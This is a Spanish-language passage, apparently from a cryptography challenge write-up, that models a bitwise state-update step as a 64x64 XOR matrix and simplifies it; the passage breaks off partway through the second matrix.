<p>Nótese que $\overline{a} \hat{} \overline{b} = a \hat{} b$, por lo que el siguiente <code>state</code> se puede simplificar a:</p>
<p>$$
\mathrm{state} = [(s_{59} \hat{} s_{62}), (s_{59} \hat{} s_{61}), (s_{60} \hat{} s_{62}), (s_{59} \hat{} s_{62}),
$$</p>
<p>$$
(s_{55} \hat{} s_{58}), (s_{55} \hat{} s_{57}), (s_{56} \hat{} s_{58}), (s_{55} \hat{} s_{58}),
$$</p>
<p>$$
\dots
$$</p>
<p>$$
(s_3 \hat{} s_6), (s_3 \hat{} s_5), (s_4 \hat{} s_6), (s_3 \hat{} s_6),
$$</p>
<p>$$
(s_2 \hat{} s_{61}), (s_1 \hat{} s_{61} \hat{} s_{63}), (s_0 \hat{} s_2 \hat{} s_{62}), (s_2 \hat{} s_{61})]
$$</p>
<p>Recordemos que este nuevo <code>state</code> es para la siguiente iteración del algoritmo de código evolutivo. Podríamos continuar así hasta la última iteración, pero sería muy largo. En cambio, podemos crear una matriz de 64x64 tal que, dado un <code>state</code>, genere el siguiente (también es muy grande, pero será más fácil de utilizar):</p>
<p>$$
\begin{pmatrix}
0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \color{red}{1} 0 0 0 \newline
0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 \newline
\color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \newline
0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} \newline
0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0
\end{pmatrix}
$$</p>
<p>Si llamamos a esta matriz $A$, tenemos esta relación:</p>
<p>$$
\begin{pmatrix}
n_{63} \newline
n_{62} \newline
\vdots \newline
n_1 \newline
n_0
\end{pmatrix} = A \cdot \begin{pmatrix}
s_{63} \newline
s_{62} \newline
\vdots \newline
s_1 \newline
s_0
\end{pmatrix}
$$</p>
<p>Donde $n$ es el siguiente <code>state</code> y $s$ es el <code>state</code> actual en una determinada iteración.</p>
<p>Podemos mejorar esta matriz sabiendo que el primer bit y el último de cada cuarteto son el mismo, por lo que $s_{63} = s_{60}$, $s_{59} = s_{56}$ hasta $s_3 = s_0$:</p>
<p>$$
\begin{pmatrix}
0 0 \color{red}{1} 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 \color{red}{1} 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 \color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \newline
